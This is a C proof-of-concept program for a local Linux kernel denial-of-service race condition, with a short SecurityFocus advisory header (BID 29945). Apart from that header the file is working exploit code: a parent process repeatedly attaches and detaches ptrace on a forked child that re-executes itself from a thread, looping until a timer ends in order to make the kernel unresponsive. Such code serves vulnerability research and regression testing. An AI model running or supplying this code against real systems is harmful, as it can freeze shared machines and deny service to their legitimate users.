/*
source: https://www.securityfocus.com/bid/29945/info

The Linux kernel is prone to a local denial-of-service vulnerability caused by a race condition.

Attackers can exploit this issue to cause the kernel to become unresponsive, denying service to legitimate users.
*/

/* This software is provided 'as-is', without any express or implied
   warranty.  In no event will the authors be held liable for any
damages
   arising from the use of this software.

   Permission is granted to anyone to use this software for any purpose,
   including commercial applications, and to alter it and redistribute
it
   freely.  */

#ifdef __ia64__
#define ia64_fpreg ia64_fpreg_DISABLE
#define pt_all_user_regs pt_all_user_regs_DISABLE
#endif	/* __ia64__ */
#include <sys/ptrace.h>
#ifdef __ia64__
#undef ia64_fpreg
#undef pt_all_user_regs
#endif	/* __ia64__ */
#include <linux/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#if defined __i386__ || defined __x86_64__
#include <sys/debugreg.h>
#endif

#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>

/* WARNING: The real testing count is probably unbound.  */
#define DEFAULT_TESTTIME 10	/* seconds */

static pid_t pid;

static void
cleanup (void)
{
  if (pid != 0)
    kill (pid, SIGKILL);
}

static void
handler_fail (int signo)
{
  cleanup ();

  signal (signo, SIG_DFL);
  raise (signo);
}

static void *thread_func(void *argv0_pointer)
{
	execl("/proc/self/exe", argv0_pointer, "child", NULL);
	abort ();
	/* NOTREACHED */
}

int main(int argc, const char *argv[])
{
	char *testtime = getenv ("TESTTIME");
	time_t testend = time (NULL) + (testtime != NULL ? atoi
(testtime)
							 :
DEFAULT_TESTTIME);
	unsigned long loops;
	pthread_t thread;

	atexit (cleanup);
	signal (SIGABRT, handler_fail);
	signal (SIGINT, handler_fail);

	if ((argc != 2 || strcmp (argv[1], "child") != 0) && (pid =
fork())) {
		loops = 0;
		do {
			ptrace(PTRACE_ATTACH, pid, NULL, 0);
			ptrace(PTRACE_DETACH, pid, NULL, 0);
			loops++;
		} while (time (NULL) < testend);
		return 0;
	}

	if (pthread_create(&thread, NULL, thread_func, (void *)
argv[0]))
		perror("pthread_create");

	while (1)
		pause();
	/* NOTREACHED */
	abort ();
}